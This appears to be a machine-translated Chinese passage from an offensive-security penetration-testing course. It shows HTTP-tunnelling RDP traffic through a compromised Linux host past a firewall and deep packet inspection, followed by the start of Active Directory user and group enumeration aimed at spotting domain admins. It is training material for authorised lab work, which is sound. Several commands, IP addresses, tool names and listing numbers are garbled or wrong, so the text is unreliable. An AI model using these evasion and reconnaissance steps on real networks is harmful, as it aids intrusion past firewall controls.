
在这种情况下，我们的目标是仅使用 HTTP 协议，从 Kali Linux 机器通过被破解的 Linux 服务器向 Windows Server 2016 发起远程桌面连接。

## 攻击性 (OFFENSIVE SECURITY)

我们将依靠 `HTTPTunnel` 将流量封装在 HTTP 请求中，创建一个“HTTP 隧道”。`HTTPTunnel` 使用客户端/服务器模型，我们需要安装该工具，然后运行客户端和服务器。

> `stunnel` 工具与 `HTTPTunnel` 类似，可以以类似的方式使用。它是一个多平台的 GNU/GPL 许可代理程序，可以使用 SSL/TLS 加密任意 TCP 连接。

我们可以如下所示从 Kali Linux 存储库安装 `HTTPTunnel`：

```bash
kali@kali:~$ apt-search httptunnel

httptunnel - Tunnels a data stream in HTTP requests

kali@kali:~$ sudo install httptunnel
```

### 列表 65 - 从 Kali Linux 存储库安装 HTTPTunnel

在深入之前，我们将描述我们正尝试实现的流程。

首先，记住我们在内部 Linux 服务器上有一个 shell。该 shell 是基于 HTTP 的（这是防火墙允许的唯一协议），我们通过 TCP 端口 `443`（受漏洞服务器端口）与其连接。

我们在这台机器上创建一个到 `8888` 端口的本地转发，这将所有连接转发到 Windows Server 的 `3389` 端口（远程桌面端口）。注意，此端口不受 HTTP 协议限制，因为两台机器在同一网络中，且流量不经过深度包检测服务。然而，当我们尝试从 Linux 服务器连接隧道到我们基于互联网的 Kali Linux 机器时，协议限制将产生问题。这就是我们基于 SSH 的隧道由于协议不允许而被拦截的地方。

为了解决这个问题，我们使用 `HTTPTunnel` 在机器之间创建一个 HTTP 隧道（一种允许的协议）。此 `HTTPTunnel` 的“输入”位于我们的 Kali Linux 机器上（本地端口 `8080`），隧道将“输出”到监听在 `1234` 端口的被破解的 Linux 上（防火墙）。HTTP 请求将被解封装，流量将交给我们基于 SSH 的本地转发，重定向到我们 Windows 目标的远程桌面端口。

设置完成后，我们将向 Kali Linux 机器的本地端口 `8080` 启动远程桌面会话。请求将被 HTTP 封装，通过 `HTTPTunnel` 作为 HTTP 流量发送到 Linux 服务器的 `1234` 端口（解封装），最后发送到我们 Windows 目标的远程桌面端口。

⁹96 (Sebastian Weber, 2010), http://http.tunnel.seforge.net/
⁹97 (Stunnel, 2019), https://www.org/
⁹98 (Sebastian Weber, 2010), http://http.tunnel.seforge.net/

## 使用 Kali Linux 2.0 进行渗透测试

## 攻击性 (OFFENSIVE SECURITY)
www.offensive-security.com

在继续之前，花点时间理解这个诚然复杂的流量流。带有封装的端口转发可能是复杂的，因为我们必须考虑防火墙规则、协议限制以及入站和出站端口分配。在执行实际命令之前，暂停并绘制一张如图 304 所示的地图或流程图通常会有帮助。如果不尝试同时理清逻辑和语法，这个过程将变得非常复杂。

图 304：HTTP 封装
- 攻击者 (Kali)
- Linux 客户端
- Windows Server 2016
- 防火墙仅允许 80 端口的 HTTP 协议，此外错误配置允许 1234 端口的 TCP 流量
- 我们从客户端的 8888 端口创建到 Windows Server 2016 3389 端口的本地转发
- 我们在 Linux 客户端上设置 HTTPTunnel 服务器
- 我们启动 HTTPTunnel 客户端连接服务器
- 为了启动隧道，我们被破解的 Linux 机器和 Windows 远程桌面之间创建一个基于 SSH 的端口转发。注意，在这里协议很重要（使用了 SSH），因为流量不受深度包检测的影响。为了做到这一点，我们将从这台机器 (127.0.0.1) 创建本地转发并使用渗透后的新密码登录。我们将 8888 端口上的所有请求转发到 Windows 远程端口 (192.168.110:3389)。

```bash
student@debian=$ ssh -L 0.0.0.0:8888:192.168.110:3389 student@127.0.1

无法创建目录 '/root/.ssh/'。127.0.0.1 的真实性无法建立。

ECDSA 指纹为 SHA256:RdJnWlcEGy+CnShII6oyAB3JD。

确定要继续连接吗 (yes/no)? yes

无法将主机添加到已知主机列表 (/root/.ssh/known_hosts)。

127.0.0.1 的密码：

student@debian:~# ss -antp | grep "8888"
```

2.0
Copyright © Offensive Security Ltd. 保留所有权利。

## 攻击性 (OFFENSIVE SECURITY)

`ss -antp | grep "8888"`
`LISTEN 0 1`

### 列表 58 - 通过被破解的 Linux 机器转发 端口到 Windows Server 2016 的 端口

下一步，我们必须为 Kali Linux 机器创建一个 HTTPTunnel 以剥离仅 HTTP 的协议限制。如上所述，HTTPTunnel 同时使用客户端 (`hts`) 和服务器 (`sts`)。我们将设置服务器 (`sts`)，它将监听本地端口 `1234`，解封装来自入站 HTTP 流的流量并将其重定向到本地端口 `8888`，并将之前的连接重定向到 Windows 目标的远程桌面。

```bash
student@debian:~# hts --forward-port localhost 8888 1234

hts --forward-port localhost 8888

student@debian:~# ps aux | grep hts

student 12080 0.0 0.0 2420 68 ? Ss 07:04 0:00 --forward-port localhost 8888 1234

student 12084 0.0 0.0 4728 S+ 07:49 0:00 grep hts
```

```bash
student@debian:~# ss -antp | grep "1234"

ss -antp | grep "1234"

LISTEN 0 1 *:1234 *: users:("hts",pid=12080,fd=4))
```

### 列表 59 - 设置 HTTPTunnel 服务器

`ps` 和 `ss` 命令显示 HTTPTunnel 服务器已启动并运行。

接下来，我们需要一个 HTTPTunnel 客户端调用我们的远程桌面流量，将其封装为 HTTP 流并发送到 HTTPTunnel 服务器。此 (`hts`) 命令将监听本地端口 `8080` (`--forward-port 8080`)。封装流量并跨越防火墙转发到我们监听在 `1234` 端口的 HTTPTunnel 服务器 (`10.11.0.128:1234`)。

```bash
kali@kali:~# hts --forward-port 8080 10.11.0.128:1234

kali@kali:~# ps aux | grep htc

kali 10051 0.0 0.0 6536 92 ? Ss 03:33 0:00 htc --forward-port 8080 10.11.0.128:1234

kali 10053 0.0 0.0 12980 1856 pts/0 S+ 03:33 0:00 grep htc
```

```bash
kali@kali:~# ss -antp | grep "8080"

LISTEN 0 0 0.0.0.0:0.0.0.0:*: users:("htc",pid=2692,fd=4))
```

### 列表 60 - 设置 HTTPTunnel 客户端组件

再次，`ps` 和 `ss` 命令显示 HTTPTunnel 已启动并运行。

现在，所有到我们 Kali Linux 机器 TCP 端口 `8080` 的流量都将重定向到我们的 HTTPTunnel 中（其中它被 HTTP 封装，跨越防火墙发送到被破解的 Linux 服务器并解封装），然后再次重定向到 Windows Server 的远程桌面服务。

## 使用 Kali Linux 进行渗透测试 2.0

我们可以通过启动 Wireshark 嗅探流量来验证此操作是否有效，并在 HTTP 封装之前，向我们 Kali Linux 机器的 `8080` 端口发起远程桌面连接：

![](img/f99f528ca9845f4c256ce54e882b1345_619_0.png)

图 305：通过 HTTP 隧道在 Windows Server 2016 机器上进行 RDP 登录

太棒了！远程桌面连接成功。

通过检查 Wireshark 中的流量，我们确认它确实被封装在 HTTP 中，并且可以绕过深度包内容检测设备。

## 使用 Kali Linux 进行渗透测试 2.0

![](img/f99f528ca9845f4c256ce54e882b1345_620_0.png)

- 帧 131: 111 字节 (888 字节)，传输了 111 字节 (88 kb)
- 帧 132: 120 字节 (960 字节)，传输了 120 字节 (96 kb)
- 帧 133: 126 字节 (1008 字节)，传输了 126 字节 (100 kb)
- 传输协议：TCP
- 数据: 87 字节 (696 字节)，传输了 87 字节 (696 bits)

```
GET /index.php HTTP/1.1

Host: 10.11.10.4:1234

User-Agent: Mozilla/5.0

Connection: close

[POST request 1/]

POST /index.php HTTP/1.1

Host: 10.11.10.4:1234
```

图 306：在 Wireshark 中插入 HTTP 封装的流量

### 20.5.1 练习题

1. 以学生账户连接到你的专用 Linux 实验室，运行 `rdesktop` 并以 root 身份运行 `/root/port_forwarding_and_tunneling/http_tunnel.sh`。
2. 启动 `apache2` 服务器并利用托管在 `443` 端口的漏洞 Web 应用（在之前的模块中介绍过）来获取反向 HTTP Shell。
3. 使用你的专用客户端重现演示的场景。

### 20.6 总结

在本模块中，我们涵盖了端口转发和隧道技术的概念。该模块包含了在 Windows 和 NIX 操作系统上应用这些技术的工具，这允许我们绕过出站规则以及深度包检测。

## 活动目录 (Active Directory) 攻击

Microsoft Active Directory 服务（通常称为 Active Directory，简称 AD）是一项允许系统管理员在大范围内更新和管理操作系统、应用程序、用户和数据访问的服务。由于 Active Directory 是一个非常复杂且细粒粒度的管理层，它构成了一个非常大的攻击面，并值得关注。

在本模块中，我们将介绍 Active Directory 并演示枚举、身份验证和横向移动技术。

### 21.1 活动目录理论

让我们从简要概述 Active Directory 的概念和术语开始，在进入枚举和利用之前打下基础。

Active Directory 由多个组件组成。最重要的组件是域控制器（DC），它是一个安装了 Active Directory 域服务的 Windows 2000-2019 服务器。域控制器是 Active Directory 的中心和核心，因为它存储了关于特定 Active Directory 实例配置的所有信息。它执行大量的规则，规定了 Windows 域内的对象如何相互作用，以及终端用户可以使用哪些工具。Active Directory 的强大和复杂性基于于网络管理员可用的惊人细粒度控制。

> 有三个不同版本的 Windows Server 操作系统。第一个是原始的“桌面体验”版本。随 Windows Server 2008 R2 引入的 Server Core 是一个没有专用图形界面的精简服务器。最新版本 Server Nano 是 Windows Server 2016 中引入的，它比 Server Core 还要精简。标准的“桌面体验”版和 Server Core 版本可以作为域控制器。Nano 版本无法编辑

当配置 Active Directory 时，会创建一个名为 `corp.where` 的域，其中 `corp` 是组织的名称。在该域内，你可以添加各种类型的对象，包括计算机对象和用户对象。

系统管理员（几乎总是）借助组织单位（OU）的帮助来组织这些对象。OU 类似于文件文件夹，它们是用于存储和分组其他对象的容器。计算机对象代表实际的用户和工作站

⁶⁰ (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview
⁶¹ (Microsoft, 2014), https://technet.microsoft.com/library/ct86438?vs=10).aspx
⁶² (Microsoft, 2008), https://msdn.microsoft.com/library/ee391626v?vs=85).aspx
⁶³ (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-server/get-started/getting-starting-with-nano-server
⁶⁴ (Microsoft, 2018), https://technet.microsoft.com/library/ct9803.aspx

# 攻击性安全

Active Directory 对象随类型而异，可以被视为域的成员。例如，用户、组和打印机。将使用 Active Directory 相关的技术进行枚举和利用。在现实世界的场景中，可以使用之前模块中概述的许多 Windows 枚举技术。

但在本模块中，我们将专注于专门为 AD 设计的技术。我们假设已经获取了 Windows 10 工作站的访问权限，并假设已经攻破 Offsec 域用户，该用户是本地管理员组的成员。

我们在该场景中的第一个目标是枚举域用户并尽可能了解他们的组组成。为了实现这一点，我们将利用多种工具和技术，这些可以在没有任何管理员权限的情况下执行。

### 21.2 活动目录枚举

攻击通常从枚举开始。一旦建立了立脚点，目标就是枚举域用户和组组成。

### 21.2.1 传统方法

第一种技术（我们称为“传统”方法）利用内置的 `net.exe` 程序。具体来说，我们将使用 `net user` 子命令，它可以枚举所有本地账户。

```
C:\Users\offsec.corp net user
```

CLIENT251 的用户账户

| admin Administrator | DefaultAccount |
| Guest student | WDAGUtilityAccount |
| 命令成功完成。 |

添加 `/domain` 标志将枚举整个域的所有用户：

```
C:\Users\Offsec.corp net user /domain
```

请求将在 `corp.com` 域控制器处处理。

DC01.corp.com 的用户账户

| admin Administrator | DefaultAccount |
| Guest iis_service | jeff_admin |

# 攻击性安全

使用 Kali Linux 2.0 进行渗透测试

```
krbtgt sql_service

命令成功完成。
```

> 列表 662 - 运行 net user domain 命令

在生产环境中运行此命令可能会返回一个长得多的用户列表。有了这个列表，我们现在可以查询有关单个用户的信息。

根据上面的输出，我们应该查询 `jeff_admin` 用户，因为这个名字听起来很有戏。

> 我们过去的经验表明，管理员往往倾向于在用户名上添加前缀或后缀，以根据其功能识别账户。

```
C:\Users\Offsec.corp> net user jeff_admin /domain

请求将在域 corp.com 的域控制器上处理。
```

用户名 `jeff_admin`
全名 Jeff_Admin
注释
用户的注释
国家/区域代码 000（系统默认）
账户活动：是
账户过期：永不期
密码最后设置于 2018/2/19 下午 1:56:22
密码过期：永不期
密码可更改：2018/2/19 下午 1:56:22
密码需要：是
用户可以更改密码：是

允许的工作站：所有
登录脚本
用户配置文件
主目录
最后登录：从未登录

允许的登录时间：所有

本地组组成
组组成：*Domain Users *Domain Admins
命令成功完成。

> 列表 663 - 针对特定用户运行 net user

输出表明 `jeff_admin` 是 `Domain Admins` 组的成员，因此我们将尽力记住这一点。

为了列出域中的所有组，我们可以向 `net group` 命令提供 `/domain` 参数^467。

# 使用 Kali Linux 2.0 进行渗透测试

```
C:\Users\offsec.corp net group /domain
```
